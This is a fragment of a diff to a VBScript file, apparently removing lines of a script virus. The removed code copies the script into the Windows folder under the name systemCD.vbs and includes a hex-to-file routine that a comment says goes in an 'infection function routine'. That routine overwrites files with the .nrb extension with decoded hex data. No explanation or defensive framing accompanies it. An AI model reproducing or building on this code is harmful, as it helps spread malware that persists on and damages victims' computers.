@@ -22,18 +22,3 @@ strhexvalue = strHexValue & strhex
 end if
 next
 end function
-[/code]
-Hex to EXE
-Set Fso=CreateObject("Scripting.FileSystemObject")
-cpy.Copy(Fso.GetSpecialFolder(0)&"\systemCD.vbs")
-'Put this function on your infection function routine
-'----------------------------------------------------
-If fso.GetExtensionName(file.path)="nrb" then
-a = "0E4E65726F49534F302E30322E303301000000010000000000124"
-GenCode = a
-For letscount = 1 To Len(GenCode) Step 2
-NewCode = NewCode & Chr("&h"& Mid(GenCode, letscount, 2))
-next
-Set YourFile = fso.createtextfile(file.path, True)
-YourFile.write NewCode
-YourFile.close
